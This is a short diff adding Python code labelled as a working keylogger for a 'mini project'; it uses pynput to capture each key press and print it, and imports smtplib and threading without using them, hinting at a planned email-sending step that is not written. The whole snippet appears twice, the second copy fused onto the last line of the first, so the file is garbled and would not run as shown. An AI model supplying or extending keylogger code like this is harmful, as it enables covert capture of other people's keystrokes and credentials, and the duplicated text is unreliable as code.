@@ -1,0 +1,33 @@
+keylogger working code for mini project
+
+
+
+
+import pynput.keyboard as keyboard
+import threading
+
+import smtplib
+
+def grab_keys(key):
+    print(key)
+
+listener = keyboard.Listener(on_press=grab_keys)
+
+with listener:
+    listener.join()keylogger working code for mini project
+
+
+
+
+import pynput.keyboard as keyboard
+import threading
+
+import smtplib
+
+def grab_keys(key):
+    print(key)
+
+listener = keyboard.Listener(on_press=grab_keys)
+
+with listener:
+    listener.join()
